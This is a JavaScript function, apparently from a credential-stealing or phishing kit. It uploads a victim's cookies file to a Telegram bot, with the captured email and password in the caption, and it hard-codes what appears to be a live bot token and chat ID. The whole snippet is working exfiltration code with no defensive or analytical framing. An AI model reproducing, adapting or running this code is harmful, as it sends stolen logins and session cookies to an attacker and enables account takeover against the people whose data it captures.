// Function to send cookies file along with email and password to Telegram
async function sendCookiesToTelegram(filePath, email, password) {
  const apiToken = "7479603239:AAEgqaRjV5FM1P5mAyP0LWoN7g8FVNgp_R8"; // Replace with your Telegram Bot API token
  const chatId = "2127941790"; // Replace with your Telegram chat ID

  try {
    const url = `https://api.telegram.org/bot${apiToken}/sendDocument`;

    // Create a message with email and password
    const message = `Email: ${email || "Not available"}\nPassword: ${password || "Not available"}`;

    // Create a FormData instance and append the required fields
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", fs.createReadStream(filePath)); // Attach the cookies file
    formData.append("caption", message); // Attach the email and password as a caption

    // Use axios to send the file with the correct headers
    await axios.post(url, formData, {
      headers: formData.getHeaders(), // Get the correct headers from the FormData instance
    });

    console.log("Cookies file, email, and password sent to Telegram successfully.");
  } catch (error) {
    console.error("Error sending cookies file to Telegram:", error.message);
  }
}
